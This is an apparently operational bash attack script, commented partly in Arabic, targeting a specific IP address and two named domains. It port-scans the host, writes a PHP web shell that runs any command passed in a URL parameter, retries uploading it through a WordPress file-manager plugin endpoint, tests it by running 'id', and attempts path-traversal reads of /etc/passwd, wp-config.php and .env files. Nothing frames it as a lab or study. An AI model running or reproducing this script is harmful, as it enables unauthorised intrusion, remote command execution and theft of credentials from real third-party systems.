#!/bin/bash

IP="141.94.221.68"
DOMAINS="video.iam.ma apps.iam.ma"
OUTPUT="complete_results"
mkdir -p $OUTPUT

echo "Starting COMPLETE scan - This will NOT stop until finished..."

# ============================================
# فحص جميع المنافذ (بدون توقف)
# ============================================
echo "[1] Scanning all ports..."
for port in 22 80 443 2082 2083 2087 2095 2096 3306 8080 8443 8888 10000; do
    (echo >/dev/tcp/$IP/$port) 2>/dev/null && echo "Port $port: OPEN" >> $OUTPUT/ports.txt
done

# ============================================
# اختبار جميع النطاقات
# ============================================
echo "[2] Testing all domains..."
for domain in $DOMAINS; do
    curl -s -o /dev/null -w "$domain: %{http_code}\n" "https://$domain" --max-time 5 >> $OUTPUT/domains.txt
    curl -s -k "https://$domain/wp-login.php" -o /dev/null -w "$domain/wp-login: %{http_code}\n" >> $OUTPUT/wp.txt
done

# ============================================
# محاولة رفع Shell (مع إعادة المحاولة)
# ============================================
echo "[3] Attempting shell upload (with retries)..."
echo '<?php system($_GET["c"]); echo "OK"; ?>' > $OUTPUT/s.php

for i in {1..5}; do
    for domain in $DOMAINS; do
        curl -s -k -F "file=@$OUTPUT/s.php" "https://$domain/wp-content/plugins/wp-file-manager/upload.php" 2>/dev/null
    done
    sleep 1
done

# اختبار الشل
for path in "wp-content/uploads/s.php" "wp-content/uploads/wp-file-manager/s.php"; do
    for domain in $DOMAINS; do
        TEST=$(curl -s -k "https://$domain/$path?c=id" --max-time 3 2>/dev/null)
        if [ -n "$TEST" ]; then
            echo "SHELL: https://$domain/$path?c=COMMAND" >> $OUTPUT/shell.txt
        fi
    done
done

# ============================================
# LFI على جميع المسارات
# ============================================
echo "[4] Testing LFI..."
PATHS="../../../../etc/passwd ../../../../wp-config.php ../../../../.env"
for domain in $DOMAINS; do
    for path in $PATHS; do
        curl -s -k "https://$domain/wp-content/plugins/wp-file-manager/readme.txt?file=$path" --max-time 5 >> $OUTPUT/lfi_content.txt
    done
done

# ============================================
# التقرير النهائي
# ============================================
echo ""
echo "═══════════════════════════════════════════════════════════════════"
echo "SCAN COMPLETE - Results in: $OUTPUT/"
echo "═══════════════════════════════════════════════════════════════════"
cat $OUTPUT/*.txt 2>/dev/null
